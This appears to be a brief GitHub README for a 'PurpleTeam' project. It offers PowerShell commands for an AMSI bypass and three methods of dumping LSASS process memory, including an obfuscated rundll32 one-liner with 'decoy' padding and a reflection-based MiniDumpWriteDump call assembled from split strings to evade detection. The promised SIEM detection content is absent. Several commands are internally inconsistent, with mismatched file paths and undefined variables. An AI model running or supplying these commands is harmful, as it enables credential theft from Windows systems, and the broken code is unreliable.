# PurpleTeam
Execution Bypass AMSI and Lsass Dump Attacks and detection by SIEM

Bypass AMSI
-
Run file in powershell and then execute below command :
'AmsiUtils'

Lsass Dump via mini dump needs to run as admin access

Method 1 to Lsass Dump:
-
Minidump.exe <lsass PID>


Method 2 to lsass Dump:
-
&$env:???t??r???\*2\r[t-u]???[k-l]?2* $(gi $env:???t??r???\*2\c?m?[v-w]*l | % {$_.FullName }), `#-999999999999999999999999999999999999999999999999999999999999999999999999999999999976-decoy $(gps l?a*s).id c:\parastoo.tmp full; Wait-Process -Id (Get-Process rundll32).id ; (Get-Item -Path c:\dmp.tmp).Encrypt();


Method 3 to Lsass Dump:
-
1-Crete temp folder in drive C:

2-Execute below commands in powershell

$S = "C:\temp"
$P = (Get-Process lsass)
$A = [PSObject].Assembly.GetType('Syst'+'em.Manage'+'ment.Autom'+'ation.Windo'+'wsErrorRe'+'porting')
$B = $A.GetNestedType('Nativ'+'eMethods', 'Non'+'Public')
$C = [Reflection.BindingFlags] 'NonPublic, Static'
$D = $B.GetMethod('MiniDum'+'pWriteDump', $C) 
$F = New-Object IO.FileStream($PDP, [IO.FileMode]::Create)
$R = $D.Invoke($null, @($P.Handle,$G,$F.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
$F.Close()



https://github.com/ParastouRazi/PurpleTeam/assets/85788536/f031c264-c4f9-4fcb-8bee-17badf0866b0



See below link to view execution 

https://www.youtube.com/watch?v=Nfh9EEJ8wcw
-




